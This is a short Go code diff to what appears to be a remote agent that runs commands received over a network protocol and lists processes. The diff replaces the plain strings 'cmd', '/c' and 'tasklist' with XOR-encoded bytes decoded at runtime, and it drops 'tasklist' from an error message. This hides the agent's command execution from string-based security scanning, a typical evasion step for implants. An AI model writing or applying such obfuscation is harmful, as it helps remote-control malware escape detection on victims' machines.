@@ -7,6 +7,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/falke-ai-circuit/probe/internal/obfs"
 	"github.com/falke-ai-circuit/probe/internal/protocol"
 )
 
@@ -88,7 +89,7 @@ func (a *Agent) handleProcStart(env protocol.Envelope) protocol.Envelope {
 		// Start in background — don't wait for output
 		var cmd *exec.Cmd
 		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd", "/c", "start", "/b", params.Command)
+			cmd = exec.Command(obfs.Str("\x39\x37\x3e"), obfs.Str("\x75\x39"), "start", "/b", params.Command)
 		} else {
 			cmd = exec.Command("sh", "-c", params.Command)
 		}
@@ -126,9 +127,9 @@ func (a *Agent) handleProcStart(env protocol.Envelope) protocol.Envelope {
 
 // windowsProcessList runs tasklist and parses the output.
 func windowsProcessList() ([]protocol.ProcessInfo, error) {
-	out, err := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
+	out, err := exec.Command(obfs.Str("\x2e\x3b\x29\x31\x36\x33\x29\x2e"), "/FO", "CSV", "/NH").Output()
 	if err != nil {
-		return nil, fmt.Errorf("tasklist failed: %v", err)
+		return nil, fmt.Errorf("process list failed: %v", err)
 	}
 
 	var procs []protocol.ProcessInfo
